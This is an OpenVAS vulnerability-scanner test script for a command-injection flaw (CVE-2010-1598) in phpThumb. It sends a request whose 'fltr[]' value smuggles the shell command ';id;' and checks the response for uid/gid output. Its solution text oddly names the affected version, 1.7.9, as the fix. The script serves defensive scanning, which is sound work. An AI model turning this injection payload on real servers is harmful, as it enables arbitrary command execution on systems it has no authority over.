###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpthumb_cmd_inj_vuln.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# phpThumb 'fltr[]' Parameter Command Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Updated from version check to active exploit by Michael Meyer
# <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801233");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-11-11 07:48:04 +0100 (Thu, 11 Nov 2010)");
  script_cve_id("CVE-2010-1598");
  script_bugtraq_id(39605);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("phpThumb 'fltr[]' Parameter Command Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/39556");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58040");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_phpthumb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject and execute
arbitrary shell commands via specially crafted requests in the context of the
web server.");
  script_tag(name:"affected", value:"phpThumb Version 1.7.9");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
via the 'fltr[]' parameter to 'phpThumb.php', which allow attackers to inject
and execute arbitrary shell commands via specially crafted requests.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to version 1.7.9 or later.");
  script_tag(name:"summary", value:"The host is running phpThumb and is prone to command injection
vulnerability.");
  script_xref(name:"URL", value:"http://phpthumb.sourceforge.net/#download");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!dir = get_dir_from_kb(port:port,app:"phpThumb"))exit(0);
url = dir + '/phpThumb.php?src=/home/example.com/public_html/openvas.jpg&fltr[]=blur|5%20-quality%2075%20-interlace%20line%20%22/home/example.com/public_html/openvas.jpg%22%20jpeg:%22/home/example.com/public_html/openas.jpg%22;id;&phpThumbDebug=9';

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {

   security_message(port:port);
   exit(0);

}
